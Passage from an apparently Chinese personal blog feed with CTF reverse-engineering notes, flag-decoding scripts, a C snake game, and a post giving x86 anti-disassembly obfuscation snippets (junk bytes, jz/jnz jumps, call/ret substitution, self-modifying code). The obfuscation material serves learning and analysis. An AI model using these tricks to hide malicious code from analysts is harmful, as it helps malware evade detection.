(求逆元)</span></span><br><span class="line">m = gmpy2.powmod(c, d, n)  <span class="comment"># 即m = c^d mod n (求大整数c的d次幂模n取余)</span></span><br><span class="line">flag = <span class="built_in">str</span>(<span class="built_in">hex</span>(m))[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(flag).decode())</span><br></pre></td></tr></table></figure><h1 id="计算机程序执行"><a href="#计算机程序执行" class="headerlink" title="计算机程序执行"></a>计算机程序执行</h1><h2 id="fini-arry"><a href="#fini-arry" class="headerlink" title=".fini_arry"></a>.fini_arry</h2><p>2023.9.22</p><p>问题来自<code>[2019红帽杯]easyRE</code></p><p>该题中对<code>off_6CC090</code>用十次base64解密出来一个网页作为混淆,向下继续分析发现还有一个<code>byte_6CC0A0</code>开头的数据段,寻找其调用函数发现一个(隐藏的)函数,从此函数中破解出flag(具体见该题WP)</p><p>问题:这个函数没有在main中调用,那么为什么写进来呢—我最后也没弄明白,这函数跑完也啥也没干</p><p>实际发现,这个函数被写入.fini_arry中,在程序结束时进行调用:</p><p>来自<a href="https://stackoverflow.com/questions/15265295/understanding-the-libc-init-array%E7%9A%84%E5%9B%9E%E7%AD%94">https://stackoverflow.com/questions/15265295/understanding-the-libc-init-array的回答</a>:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230922151506432.png" alt="image-20230922151506432"></p><h1 id="编程语言技巧"><a href="#编程语言技巧" class="headerlink" title="编程语言技巧"></a>编程语言技巧</h1><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="字节流转为int"><a href="#字节流转为int" class="headerlink" title="字节流转为int"></a>字节流转为int</h3><p>见[<a href="https://www.ctfer.vip/problem/403">SWPUCTF 2021 新生赛]简简单单的逻辑</a></p><p>使用int.from_bytes()方法进行字节流转为int的操作,同时需要指定大小端序</p><p>解密脚本:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;xxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">47</span>, <span class="number">138</span>, <span class="number">127</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">143</span>, <span class="number">17</span>, <span class="number">84</span>, <span class="number">42</span>, <span class="number">135</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">28</span>, <span class="number">169</span>, <span class="number">25</span>]</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># for i in range(len(list)):</span></span><br><span class="line"><span class="comment">#     key = (list[i]&gt;&gt;4)+((list[i] &amp; 0xf)&lt;&lt;4)</span></span><br><span class="line"><span class="comment">#     result += str(hex(ord(flag[i])^key))[2:].zfill(2)</span></span><br><span class="line"><span class="comment"># print(result)</span></span><br><span class="line"><span class="comment"># result=bcfba4d0038d48bd4b00f82796d393dfec</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(len(list)):</span></span><br><span class="line"><span class="comment">#     list[i] = (list[i] &gt;&gt; 4) + ((list[i] &amp; 0xf) &lt;&lt; 4)</span></span><br><span class="line"><span class="comment"># print(list)</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">242</span>, <span class="number">168</span>, <span class="number">247</span>, <span class="number">147</span>, <span class="number">87</span>, <span class="number">203</span>, <span class="number">51</span>, <span class="number">248</span>, <span class="number">17</span>, <span class="number">69</span>, <span class="number">162</span>, <span class="number">120</span>, <span class="number">196</span>, <span class="number">150</span>, <span class="number">193</span>, <span class="number">154</span>, <span class="number">145</span>]</span><br><span class="line">result = <span class="string">&#x27;bcfba4d0038d48bd4b00f82796d393dfec&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(result):</span><br><span class="line">    <span class="comment"># print(int.from_bytes(binascii.unhexlify((result[i] + result[i + 1])), byteorder=&#x27;little&#x27;))</span></span><br><span class="line">    enc = <span class="built_in">int</span>.from_bytes(binascii.unhexlify((result[i] + result[i + <span class="number">1</span>])), byteorder=<span class="string">&#x27;little&#x27;</span>) <span class="comment"># 这里用到了int.from_bytes方法</span></span><br><span class="line">    <span class="comment"># print(binascii.unhexlify((result[i] + result[i + 1])))</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(enc^<span class="built_in">list</span>[i//<span class="number">2</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    i += <span class="number">2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h1><h2 id="jz-jnz无条件跳转-call脏字节"><a href="#jz-jnz无条件跳转-call脏字节" class="headerlink" title="jz+jnz无条件跳转+call脏字节"></a>jz+jnz无条件跳转+call脏字节</h2><p>例题:<a href="https://www.ctfer.vip/problem/2313">[NSSRound#3 Team]jump_by_jump</a></p><p>直接将jz和jnz下面识别出的call指令的首字节E8修改成90(nop指令),然后将后面转换出来的数据重新分析成指令,然后最后在main的开头重新生成函数即可还原函数伪代码.</p><p>问题:我的IDA莫名其妙patch为nop后,新生成的数据无法分析为数据,来回辗转好机会才成功.<code>猜测可能是重新分析成代码时,选中的数据要包含有patch出来的nop.</code></p><p>patch掉脏字节↓</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230925014252908.png" alt="image-20230925014252908" style="zoom:45%;" /><p>选中包含nop在内的那堆数据,进行analyze,然后就会生成正确的汇编代码,此时在_main_0的开头重新生成函数即可↓</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230925014609287.png" alt="image-20230925014609287" style="zoom:55%;" /><p>修复完成,此时TAB键即可生成伪代码↓</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230925014215010.png" alt="image-20230925014215010" style="zoom: 50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230925014904236.png" alt="image-20230925014904236" style="zoom:45%;" />]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> IDA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码保护和混淆</title>
      <link href="/2023-09-15-d5932dc94d91/"/>
      <url>/2023-09-15-d5932dc94d91/</url>
      
        <content type="html"><![CDATA[<h1 id="抵御静态分析"><a href="#抵御静态分析" class="headerlink" title="抵御静态分析"></a>抵御静态分析</h1><p>对于二进制程序分析,工具都要先进行反汇编,所以要进行抵御,可以对汇编进行特殊处理来干扰工具的分析</p><h2 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h2><h3 id="函数头处增加pushfd-popfd和nop指令"><a href="#函数头处增加pushfd-popfd和nop指令" class="headerlink" title="函数头处增加pushfd,popfd和nop指令"></a>函数头处增加pushfd,popfd和nop指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">;常规的函数头</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,0x100</span><br><span class="line"></span><br><span class="line">;加上花指令后</span><br><span class="line">push ebp</span><br><span class="line">pushfd</span><br><span class="line">add esp,0xd</span><br><span class="line">nop</span><br><span class="line">sub esp 0xd</span><br><span class="line">popfd</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,0x100</span><br><span class="line"></span><br><span class="line">;pushfd和popfd等指令会混淆逆向工具的栈指针解析</span><br></pre></td></tr></table></figure><h3 id="插入脏字节并设置跳转"><a href="#插入脏字节并设置跳转" class="headerlink" title="插入脏字节并设置跳转"></a>插入脏字节并设置跳转</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">jmp addr1 ;跳转到下面以保持正常的运行</span><br><span class="line">db 0xe8 ;脏字节,并且这个0xe8是call指令的起始字节,会让反汇编器认为这里是一条call指令</span><br><span class="line">addr1:</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,0x100</span><br></pre></td></tr></table></figure><h3 id="条件跳转来干扰递归下降反汇编器"><a href="#条件跳转来干扰递归下降反汇编器" class="headerlink" title="条件跳转来干扰递归下降反汇编器"></a>条件跳转来干扰递归下降反汇编器</h3><p>递归下降反汇编器虽然部分模拟了程序执行的控制流过程,但是并不是真正的运行,不能获取所有的信息,</p><p>利用这点插入条件跳转来让其反汇编所有的分支,这样就会导致0xe8被解析为指令,导致错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">jz addr1</span><br><span class="line">jnz addr1 ;实际上是成为了无条件跳转</span><br><span class="line">db 0xe8</span><br><span class="line">addr1:</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,0x100</span><br></pre></td></tr></table></figure><p>例题见<a href="../%E9%80%86%E5%90%91%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93">逆向做题总结</a></p><h3 id="同时将代码打乱顺序"><a href="#同时将代码打乱顺序" class="headerlink" title="同时将代码打乱顺序"></a>同时将代码打乱顺序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">jz addr3</span><br><span class="line">jnz addr3 ;实际上是成为了无条件跳转</span><br><span class="line">db 0xe8</span><br><span class="line">addr3:</span><br><span class="line">sub esp,0x100</span><br><span class="line">...</span><br><span class="line">addr2:</span><br><span class="line">mov ebp,esp</span><br><span class="line">jmp addr3</span><br></pre></td></tr></table></figure><h3 id="指令替换"><a href="#指令替换" class="headerlink" title="指令替换"></a>指令替换</h3><p>将一些指令替换为另一组相同或相似效果的指令来混淆,虽然程序效果没有变化,但是特殊的指令会让反汇编器出现错误</p><p>例如call,ret指令会让反汇编器解析出的函数地址范围和调用关系出现错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;call指令</span><br><span class="line">call addr</span><br><span class="line">;可替换为</span><br><span class="line">push addr</span><br><span class="line">ret</span><br><span class="line">;ret 进一步替换为(前提是ecx没有在使用)</span><br><span class="line">push ecx</span><br><span class="line">mov ecx,[esp+4]</span><br><span class="line">add esp,8</span><br><span class="line">jmp ecx</span><br></pre></td></tr></table></figure><h3 id="代码自修改-SMC"><a href="#代码自修改-SMC" class="headerlink" title="代码自修改(SMC)"></a>代码自修改(SMC)</h3><p>SMC技术会对程序特定部分在运行时进行特定的处理,并被使用函数指针来作为代码直接调用</p><p>常见于壳类程序中,静态分析时IDA等工具会将处理前的部分解析为数据,导致错误</p><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>加密壳程序分为<code>数据加密,代码加密,算法加密</code></p><p>数据加密一般是在合适的时机对程序中已有的数据进行即时的解密</p><p>代码加密同理,例如SMC技术</p><p>算法加密偏重算法的混淆,模糊与隐藏,例如VM虚拟机保护</p><h1 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h1>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见算法识别</title>
      <link href="/2023-09-14-4680fd9332b0/"/>
      <url>/2023-09-14-4680fd9332b0/</url>
      
        <content type="html"><![CDATA[<h1 id="特征值识别"><a href="#特征值识别" class="headerlink" title="特征值识别"></a>特征值识别</h1><p>许多常见算法会使用一些常量,如AES,DES等,为了提高效率,常常被硬编码在程序中,所以可以通过识别这些常量来推测程序是否使用了该算法.</p><p>例如:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/2183824-20210712212520283-1123075736.png" alt="img"></p><p>IDA中的FindCrypt插件,PEiD的KANAL可以查找特征值</p><h2 id="特征运算识别"><a href="#特征运算识别" class="headerlink" title="特征运算识别"></a>特征运算识别</h2><p>特定的算法会有与之对应的运算,特征值不足以识别的时候,可以尝试分析程序中使用了那些特征运算,来进行算法的识别</p><p>例如:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/2183824-20210712215155442-1406369467.png" alt="img"></p><h1 id="第三方库识别"><a href="#第三方库识别" class="headerlink" title="第三方库识别"></a>第三方库识别</h1><h2 id="字符串识别"><a href="#字符串识别" class="headerlink" title="字符串识别"></a>字符串识别</h2><p>许多第三方库都会将自己的版权信息,使用到的字符串(报错信息等)以字符串写入库,静态编译时,可以在二进制程序中找到这些信息,即可判断使用了哪些第三方库</p><h2 id="函数签名识别"><a href="#函数签名识别" class="headerlink" title="函数签名识别"></a>函数签名识别</h2><p>库对应一系列函数,可通过特定的函数签名来识别具体的函数,可以使用IDA的签名识别功能来进行查找,同时若IDA没有预置需要识别的库函数签名,则可以上网查找需要的函数签名库进行导入,或者使用IDA SDK中提供的FLAIR工具,根据已有的静态库文件来生成一份签名</p><h2 id="二进制比对识别"><a href="#二进制比对识别" class="headerlink" title="二进制比对识别"></a>二进制比对识别</h2><p>可以使用BinDiff工具来对二进制程序A(要分析的程序)和二进制程序B(自行找到的一个包含特定信息的程序)进行比较分析.</p><p>如果已知了A使用了某特定库,但是因为环境不同等原因不能完全匹配,这时可以找另外一个已经使用了该库的程序进行比对,来查看相似度,相似度达0.99的大概率是相同函数</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言贪吃蛇</title>
      <link href="/2023-09-08-79dbc5fa8424/"/>
      <url>/2023-09-08-79dbc5fa8424/</url>
      
        <content type="html"><![CDATA[<h1 id="游戏说明"><a href="#游戏说明" class="headerlink" title="游戏说明"></a>游戏说明</h1><p>本代码实现了Windows下(使用了Win API)基于c语言的控制台运行的贪吃蛇游戏.</p><p>代码开源至:<a href="https://github.com/gngtwhh/snake">https://github.com/gngtwhh/snake</a></p><p>代码行数: 537行</p><p>文件包括:<br>game.c 游戏运行逻辑支持<br>main.c 主函数控制<br>menu.c 菜单选择控制<br>snake.h 声明头文件<br>system.c 系统支持相关</p><p>细节描述:<br>实现菜单选择,游戏基本元素,自定义游戏设置,完善用户交互,处理用户错误输入</p><h1 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h1><h2 id="主界面"><a href="#主界面" class="headerlink" title="主界面"></a>主界面</h2><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230908110606510.png" alt="image-20230908110606510"></p><h2 id="自定义"><a href="#自定义" class="headerlink" title="自定义"></a>自定义</h2><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230908110640008.png" alt="image-20230908110640008" style="zoom:33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230908110652950.png" alt="image-20230908110652950" style="zoom:33%;" /><h2 id="游戏开始"><a href="#游戏开始" class="headerlink" title="游戏开始"></a>游戏开始</h2><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230908110721287.png" alt="image-20230908110721287"></p><h2 id="结算界面"><a href="#结算界面" class="headerlink" title="结算界面"></a>结算界面</h2><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230908110739259.png" alt="image-20230908110739259"></p><h1 id="代码详解"><a href="#代码详解" class="headerlink" title="代码详解"></a>代码详解</h1><p>注:代码中一些函数进行了简化和适当的省略,主要为了体现代码的逻辑</p><h2 id="游戏数据结构—game-c"><a href="#游戏数据结构—game-c" class="headerlink" title="游戏数据结构—game.c"></a>游戏数据结构—game.c</h2><p>使用一个双向链表来存储蛇,使用一个包含一个坐标对的结构体来存储苹果的位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// 以下在snake.h头文件中</span></span><br><span class="line"><span class="comment">#define bool int // 纯c语言,没有bool类型,需要宏定义bool类型</span></span><br><span class="line"><span class="comment">#define false 0 // 将true和false作为对应到1和0的宏</span></span><br><span class="line"><span class="comment">#define true 1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//游戏数据</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">snake</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">snake</span> *<span class="title">prior</span>, *<span class="title">next</span>;</span></span><br><span class="line">&#125; snake;<span class="comment">//蛇身体的一个结点的类型</span></span><br><span class="line">snake *head, *tail;<span class="comment">//指向蛇头和蛇尾结点的指针</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">APPLE</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">&#125; apple;<span class="comment">//苹果的坐标数据</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> score, pre_x, pre_y, wait = <span class="number">500</span>;<span class="comment">//得分;前一个x,y坐标;等待时长(和游戏难度有关---改变蛇移动的速度)</span></span><br><span class="line"><span class="type">int</span> HEIGHT = <span class="number">30</span>;<span class="comment">//地图高度</span></span><br><span class="line"><span class="type">int</span> WIDTH = <span class="number">30</span>;<span class="comment">//地图宽度</span></span><br><span class="line"><span class="type">int</span> curSnakeLen = <span class="number">0</span>;<span class="comment">//当前的蛇身长度</span></span><br><span class="line"><span class="type">int</span> maxSnakeLen = <span class="number">0</span>;<span class="comment">//地图能容纳的最大蛇身长度,达到这个长度意味着游戏胜利</span></span><br></pre></td></tr></table></figure><h2 id="游戏控制—main-c"><a href="#游戏控制—main-c" class="headerlink" title="游戏控制—main.c"></a>游戏控制—main.c</h2><p>头文件包含</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span> <span class="comment">// Console Input/Output,定义了通过控制台进行数据输入和数据输出的函数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;snake.h&quot;</span> <span class="comment">// 包含了所有的函数声明,和为了与c++兼容设置的bool宏</span></span></span><br></pre></td></tr></table></figure><p>代码逻辑</p><p>使用一个while(1)循环来重复开始游戏,从而实现一局游戏结束后可以回到主菜单准备下一次游戏</p><p>在循环中使用一个char c;配合_getch()来进行菜单选择,同时对于错误输出专门使用一个函数来处理</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">printMenu();<span class="comment">//第一次进入循环前先初始化一次菜单</span></span><br><span class="line"><span class="type">char</span> c;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;<span class="comment">//控制主循环</span></span><br><span class="line">gotoxy(<span class="number">37</span>, <span class="number">17</span>);<span class="comment">//定位到输入栏</span></span><br><span class="line">c = _getch();<span class="comment">//vs2022要求将getch()更换为_getch()---标准c编译器换回getch()(?)</span></span><br><span class="line"><span class="keyword">if</span> (c == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">initGame();<span class="comment">//游戏数据初始化</span></span><br><span class="line">start();<span class="comment">//正式开始一局游戏</span></span><br><span class="line">            destoryGameData();<span class="comment">//清除游戏数据,释放空间</span></span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);<span class="comment">//游戏结束清屏</span></span><br><span class="line">printMenu();<span class="comment">//重新打印菜单</span></span><br><span class="line">            </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;2&#x27;</span>) &#123;</span><br><span class="line">color(<span class="number">7</span>);<span class="comment">//将颜色设置回白色</span></span><br><span class="line">gotoxy(<span class="number">0</span>, <span class="number">18</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;游戏结束!\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;<span class="comment">//跳出循环,结束游戏</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> wrongInput();<span class="comment">//输入非法,打印错误信息</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="菜单选择—menu-c"><a href="#菜单选择—menu-c" class="headerlink" title="菜单选择—menu.c"></a>菜单选择—menu.c</h2><p>包含了菜单界面的图形打印,用户错误输入处理,以及游戏初始化的调用接口</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">printMenu</span><span class="params">()</span>; <span class="comment">// 打印菜单,其中利用了gotoxy()函数进行控制台光标的跳转</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">initGame</span><span class="params">()</span> &#123;<span class="comment">// 初始化各项数据,这些函数在game.c中定义</span></span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>); <span class="comment">// 清屏</span></span><br><span class="line">setDifficulty(); <span class="comment">// 设置游戏难度</span></span><br><span class="line">printBox(); <span class="comment">//打印界面</span></span><br><span class="line">initSnakeAndApple(); <span class="comment">//初始化游戏数据---蛇和苹果的初始状态</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">wrongInput</span><span class="params">()</span> &#123;<span class="comment">//处理错误的键盘输入---打印报错信息</span></span><br><span class="line">gotoxy(<span class="number">43</span>, <span class="number">17</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;输入错误!&quot;</span>);</span><br><span class="line">Sleep(<span class="number">1000</span>);<span class="comment">//停顿一秒后清除信息</span></span><br><span class="line">gotoxy(<span class="number">43</span>, <span class="number">17</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;         &quot;</span>);</span><br><span class="line">gotoxy(<span class="number">39</span>, <span class="number">17</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="系统相关支持—system-c"><a href="#系统相关支持—system-c" class="headerlink" title="系统相关支持—system.c"></a>系统相关支持—system.c</h2><p>因为是一定程度上基于Windows的程序(主要是一些优化和完善,还有关键的光标跳转),需要使用一些win API函数</p><p>使用_kbhit()来实现检测按键</p><p>头文件包含:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span> <span class="comment">// Win API支持</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;snake.h&quot;</span></span></span><br></pre></td></tr></table></figure><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//涉及到windows的API</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">color</span><span class="params">(<span class="type">int</span> i)</span> &#123;<span class="comment">//更改文字颜色</span></span><br><span class="line"><span class="comment">//SetConsoleTextAttribute是API设置控制台窗口字体颜色和背景色的函数</span></span><br><span class="line">SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//游戏中每次调用gotoxy时的参数都是根据游戏菜单字符位置/当前坐标计算好传递过来的</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">gotoxy</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">COORD c;</span><br><span class="line"><span class="type">static</span> HANDLE h;</span><br><span class="line">h = GetStdHandle(STD_OUTPUT_HANDLE);<span class="comment">//从标准设备获取句柄</span></span><br><span class="line">c.X = x;</span><br><span class="line">c.Y = y;</span><br><span class="line">SetConsoleCursorPosition(h, c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">keyboard</span><span class="params">(<span class="type">int</span> pre)</span> &#123;<span class="comment">//键盘输入判断</span></span><br><span class="line"><span class="type">char</span> c;</span><br><span class="line"><span class="type">int</span> n = pre;</span><br><span class="line"><span class="keyword">if</span> (_kbhit()) &#123;<span class="comment">//检查是否有键盘输入</span></span><br><span class="line">c = _getch();<span class="comment">//如果有,则进行一次读取</span></span><br><span class="line"><span class="keyword">if</span> (c == <span class="string">&#x27;w&#x27;</span> || c == <span class="string">&#x27;W&#x27;</span>)</span><br><span class="line">n = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;a&#x27;</span> || c == <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">n = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;s&#x27;</span> || c == <span class="string">&#x27;S&#x27;</span>)</span><br><span class="line">n = <span 